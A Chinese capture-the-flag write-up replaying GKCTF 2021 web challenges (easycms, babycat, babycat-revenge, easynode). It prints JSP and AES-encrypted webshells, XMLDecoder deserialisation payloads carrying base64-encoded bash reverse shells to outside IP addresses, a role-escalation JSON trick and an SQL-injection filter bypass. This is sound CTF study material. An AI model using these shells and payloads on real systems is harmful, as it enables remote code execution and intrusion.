@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    GKCTF2021web复现 |  Wh1tecell&#39;blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-GKCTF2021web复现"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  GKCTF2021web复现
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/09/22/GKCTF2021web%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2021-09-22T00:47:24.000Z" itemprop="datePublished">2021-09-22</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf%E6%AF%94%E8%B5%9B/">ctf比赛</a> / <a class="article-category-link" href="/categories/ctf%E6%AF%94%E8%B5%9B/2021gkctf/">2021gkctf</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.6k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">18 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="GKCTF-2021-web复现"><a href="#GKCTF-2021-web复现" class="headerlink" title="GKCTF 2021 web复现"></a>GKCTF 2021 web复现</h1><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>发现后台 <code>/admin.php</code></p>
+<p>提示了弱口令 <code>admin/12345</code></p>
+<p>这题估计就是后台getshell了</p>
+<p>在下面这个页面发现了 一个php页面</p>
+<p><img src="https://img-blog.csdnimg.cn/5e71f330291a425aa6c2f04956f7d0ac.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/5e71f330291a425aa6c2f04956f7d0ac.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>保存的时候发现需要写入文件到   <code>/var/www/html/system/tmp/kfol.txt</code> </p>
+<p>那就得再找一个能路径穿越创建这个文件到地方</p>
+<p>下图找到文件穿越到地方  写入</p>
+<p><img src="https://img-blog.csdnimg.cn/e4a44ed5ce3642af90073f8b40f8a4de.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/e4a44ed5ce3642af90073f8b40f8a4de.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>再回去模版到地方 发现保存成功 回到首页就能看到flag了</p>
+<h2 id="babycat"><a href="#babycat" class="headerlink" title="babycat"></a>babycat</h2><p>找到这个 register页面 查看源码发现</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="comment">// var obj=&#123;&#125;;</span></span><br><span class="line">    <span class="comment">// obj[&quot;username&quot;]=&#x27;test&#x27;;</span></span><br><span class="line">    <span class="comment">// obj[&quot;password&quot;]=&#x27;test&#x27;;</span></span><br><span class="line">    <span class="comment">// obj[&quot;role&quot;]=&#x27;guest&#x27;;</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">doRegister</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(obj.username==<span class="literal">null</span> || obj.password==<span class="literal">null</span>)&#123;</span><br><span class="line">            alert(<span class="string">&quot;用户名或密码不能为空&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">            d.username=obj.username;</span><br><span class="line">            d.password=obj.password;</span><br><span class="line">            d.role=<span class="string">&quot;guest&quot;</span>;</span><br><span class="line"></span><br><span class="line">            $.ajax(&#123;</span><br><span class="line">                <span class="attr">url</span>:<span class="string">&quot;/register&quot;</span>,</span><br><span class="line">                <span class="attr">type</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">                <span class="attr">contentType</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=utf-8&quot;</span>,</span><br><span class="line">                <span class="attr">data</span>: <span class="string">&quot;data=&quot;</span>+<span class="built_in">JSON</span>.stringify(d),</span><br><span class="line">                <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">                <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                    alert(data)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据要求输入json 格式注册账号密码</p>
+<p><img src="https://img-blog.csdnimg.cn/34b0d5f28e7c4a21af7ffdf869f568ff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/34b0d5f28e7c4a21af7ffdf869f568ff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>然后登录</p>
+<p>发现 download有一个任意文件下载 发现有 <code>/readflag</code> 看来事情并没有这么简单😏</p>
+<p>发现 <code>../web.xml</code> 逐一下载里面的 class文件 </p>
+<p>点击upload发现需要 admin才行</p>
+<p>先看看反编译后的 register</p>
+<p><img src="https://img-blog.csdnimg.cn/9c74ebebdf3447cd8330df51c5b5a835.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/9c74ebebdf3447cd8330df51c5b5a835.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>这里匹配的是data的最后一个 role 这里使用gson 解析 我们可以使用注释的方法绕过这个正则</p>
+<p>payload:</p>
+<p><code>data=&#123;&quot;username&quot;:&quot;11&quot;,&quot;password&quot;:&quot;11&quot;,&quot;role&quot;:&quot;admin&quot;/*&quot;role&quot;:&quot;a&quot;*/&#125;</code></p>
+<p>可以看到role 变成admin 了</p>
+<p><img src="https://img-blog.csdnimg.cn/0e9ac34ad06844ac8f2c84f9d429b8ca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/0e9ac34ad06844ac8f2c84f9d429b8ca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>下面这种也可以绕过正则 因为他正则是  ()</p>
+<p>下面这个方法也行</p>
+<p>可以发现这里的正则是 <code>(.*?)</code> 惰性匹配 所以下面这个payload只会匹配到第一个role JSON中键值一样的数据解析时后面的会覆盖前面的，因此可以构造如下payload</p>
+<p><code>data=&#123;&quot;username&quot;:&quot;111&quot;, &quot;password&quot;:&quot;111&quot;,&quot;role&quot;:&quot;test&quot;, &quot;role&quot;/**/:&quot;admin&quot;&#125;</code></p>
+<p>利用上传功能  下载<code>?file=../../WEB-INF/classes/com/web/servlet/uploadServlet.class</code></p>
+<p>审计这个文件 <code>com.web.servlet.uploadServlet</code></p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (checkExt(ext) || checkContent(item.getInputStream())) &#123;</span><br><span class="line">              req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">              req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="built_in">String</span> filePath = uploadPath + File.separator + name + ext;</span><br><span class="line">            File storeFile = <span class="keyword">new</span> File(filePath);</span><br><span class="line">            item.write(storeFile);</span><br><span class="line">            req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload success!&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们看到内容检测和扩展名检测完成之后，并没有退出，而是继续保存了文件….，因此我们可以尝试想../../static/下上传一句话</p>
+<p>jsp🐎</p>
+<p>下面这个直接命令执行  <code>?pwd=023&amp;i=/readflag</code></p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span><br><span class="line">        int a = -<span class="number">1</span>;</span><br><span class="line">        byte[] b = <span class="keyword">new</span> byte[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=<span class="keyword">in</span>.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="built_in">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连 密码  passwd</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">U</span>(<span class="params">ClassLoader c</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class <span class="function"><span class="title">g</span>(<span class="params">byte[] b</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public byte[] base64Decode(<span class="built_in">String</span> str) throws Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="built_in">String</span>.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="built_in">Object</span> decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="built_in">String</span>.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="built_in">String</span> cls = request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> U(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其它解法</p>
+<p>在<code>com.web.dao.baseDao</code>中有使⽤了<code>xmldecoder</code>(这个文件我都没注意到。。。在register那里可以看到)</p>
+<p>然后找触发，登录或注册会触发<code>baseDao.getConnection();</code>触发 <code>/db/db.xml</code></p>
+<p>此时我们就有思路了，<strong>上传进行目录穿越覆盖db.xml，登录或注册触发xml反序列化漏洞。</strong></p>
+<p><strong>这里filename=”../../db/db.xml”</strong></p>
+<p>这个xmldecoder是weblogic的老漏洞了，利用方式也是一样的，不过过滤了ProcessBuilder这样原本的payload就失效了</p>
+<p>不过在复现weblogic的漏洞时你会发现，有些特殊字符是必须进行unicode编码的，这里base64编码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>&#123;echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMTk1LjE0OS41MC83NTc1IDA+JjEn&#125;|&#123;b</span><br><span class="line">ase64,-d&#125;|&#123;bash,-i&#125;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再次登录触发利用</p>
+<h2 id="babycat-revenge"><a href="#babycat-revenge" class="headerlink" title="babycat-revenge"></a><strong>babycat-revenge</strong></h2><p>现在黑名单生效了 </p>
+<p><img src="https://img-blog.csdnimg.cn/21cdf2499bcb45619bf678a5b4a50a39.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/21cdf2499bcb45619bf678a5b4a50a39.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>写jsp  shell的方法肯定就行不通了</p>
+<p>还多过滤了<code>ProcessBuilder</code> 普通的xml也过不去了 提示<code>PrintWriter</code></p>
+<p>这里使用html实体编码绕过 这个<code>ProcessBuilder</code></p>
+<p>先读出绝对路径 才能用 <code>PrintWriter</code></p>
+<p><img src="https://img-blog.csdnimg.cn/db92e439a9134bd1b3be61ff8f3b96c6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/db92e439a9134bd1b3be61ff8f3b96c6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>编码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.<span class="symbol">&amp;#80;</span>rocessBuilder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>&#123;echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTIuMTI0LjM5LjExOC83NTc1IDA+JjEn&#125;|&#123;b</span><br><span class="line">ase64,-d&#125;|&#123;bash,-i&#125;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PrintWriter 解法</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_192&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/local/tomcat/webapps/ROOT/static/shell.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">void</span></span></span><br><span class="line"><span class="tag"><span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">&lt;![CDATA[&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload 参  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/TJWater/p/14982594.html">https://www.cnblogs.com/TJWater/p/14982594.html</a></p>
+<h2 id="easynode"><a href="#easynode" class="headerlink" title="easynode"></a>easynode</h2><p>下载源码 开始审计</p>
+<p>主要的waf如下</p>
+<p><img src="https://img-blog.csdnimg.cn/9007123c92bb4af38bb93d2146b733e8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/9007123c92bb4af38bb93d2146b733e8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>这里看了大佬的wp 很巧妙的利用数组拼接生成字符串，然后弱类型绕过 waf</p>
+<p>这里是利⽤ for 循环逐个提取字符串中的字符，再将该字符丢到⿊名单中逐字对⽐，如果发现黑名单中的危险字符，就将危险字符替换为 <code>*</code>。但如果这里是利用 for 循环遍历数组的话就是逐个对⽐数组中的元素，在这种情况下就可以绕过⿊名单。如下构造 username：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> username = [<span class="string">&quot;admin&#x27;#&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;(&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>后面的safeStr还有一个拼接 这里js数组相加的话就会成为一个字符串</p>
+<p><img src="https://img-blog.csdnimg.cn/f5f489494ef94db887867640e14a35fd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/f5f489494ef94db887867640e14a35fd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>所以payload:</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[]=admin<span class="string">&#x27;#&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=(&amp;password=123456</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就拿到了 admin的token了</p>
+<p><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiX19wcm90b19fIiwiZXhwIjoxNjMyMjE4ODcwLCJpYXQiOjE2MzIyMTcwNzB9.aeqh0p-Yug0GSYvLSuabNi7owuZ3aWWIj02SuOkT_Ss</code></p>
+<p>接下来发现  <code>adminDIV</code> 有一处原型链污染   ejs 模板 RCE</p>
